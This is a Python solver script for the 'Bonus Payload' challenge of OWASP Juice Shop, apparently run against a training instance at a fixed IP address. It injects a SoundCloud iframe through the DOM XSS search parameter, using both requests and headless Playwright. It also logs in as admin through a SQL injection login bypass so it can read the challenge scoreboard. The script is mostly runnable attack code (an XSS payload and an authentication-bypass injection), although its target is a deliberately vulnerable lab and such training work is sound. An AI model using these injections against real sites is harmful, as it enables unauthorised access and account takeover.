#!/usr/bin/env python3
"""
Bonus Payload - Correct Solution
The challenge requires using the SoundCloud iframe specifically in the DOM XSS search field
"""

from playwright.sync_api import sync_playwright
import time
import requests
import urllib.parse

TARGET = "http://66.42.93.220:3000"

# The exact payload as shown in the challenge description
BONUS_PAYLOAD = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'

print("🎯 BONUS PAYLOAD XSS CHALLENGE")
print("=" * 60)
print("📝 Challenge: Use the SoundCloud iframe in the DOM XSS search")
print("=" * 60)

# Method 1: Direct URL navigation (most reliable for DOM XSS)
print("\n🔧 Method 1: Direct DOM XSS URL injection")
encoded_payload = urllib.parse.quote(BONUS_PAYLOAD, safe='')
dom_xss_url = f"{TARGET}/#/search?q={BONUS_PAYLOAD}"

print(f"🔗 Injecting via DOM XSS search URL...")
print(f"   Payload: SoundCloud iframe")

# Use requests to trigger the URL
session = requests.Session()
resp = session.get(dom_xss_url)
print(f"   Response: {resp.status_code}")
time.sleep(2)

# Method 2: Browser automation to ensure JavaScript execution
print("\n🔧 Method 2: Browser-based DOM XSS injection")

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    
    # Handle dialogs
    page.on("dialog", lambda dialog: dialog.accept())
    
    # Navigate directly to the search page with the payload
    print("   🌐 Launching browser...")
    print("   💉 Injecting SoundCloud iframe via DOM XSS...")
    
    # Go directly to the URL with the bonus payload
    page.goto(dom_xss_url, wait_until="domcontentloaded", timeout=10000)
    time.sleep(3)
    
    # Take screenshot for verification
    page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bonus_payload_dom_xss.png")
    print("   📸 Screenshot saved")
    
    # Also try the encoded version
    encoded_url = f"{TARGET}/#/search?q={encoded_payload}"
    page.goto(encoded_url, wait_until="domcontentloaded", timeout=10000)
    time.sleep(3)
    
    browser.close()
    print("   ✅ Payload injected via browser")

# Check if challenge is solved
print("\n📊 Checking challenge status...")

session = requests.Session()
login = session.post(f"{TARGET}/rest/user/login", 
                     json={"email": "admin@juice-sh.op'--", "password": "x"})
if login.status_code == 200:
    token = login.json()['authentication']['token']
    session.headers['Authorization'] = f'Bearer {token}'

resp = session.get(f"{TARGET}/api/Challenges/")
if resp.status_code == 200:
    challenges = resp.json().get('data', [])
    bonus = next((c for c in challenges if 'Bonus' in c.get('name', '')), None)
    
    if bonus:
        if bonus.get('solved', False):
            print(f"\n✅ SUCCESS! {bonus['name']} is SOLVED!")
            print(f"   Category: {bonus.get('category', 'Unknown')}")
            print(f"   Difficulty: {'⭐' * bonus.get('difficulty', 1)}")
        else:
            print(f"\n⚠️ {bonus['name']} not yet marked as solved")
            print("\n💡 Solution Summary:")
            print("   1. The SoundCloud iframe has been injected")
            print("   2. Payload was submitted via DOM XSS search")
            print("   3. Challenge may need page refresh or manual verification")
            print(f"\n🔗 Try this URL in your browser:")
            print(f"   {dom_xss_url[:150]}...")
            print(f"\n📋 Or copy this exact payload into the search box:")
            print(f"   {BONUS_PAYLOAD}")

print("\n" + "=" * 60)
print("📊 Check the scoreboard: http://66.42.93.220:3000/#/score-board")
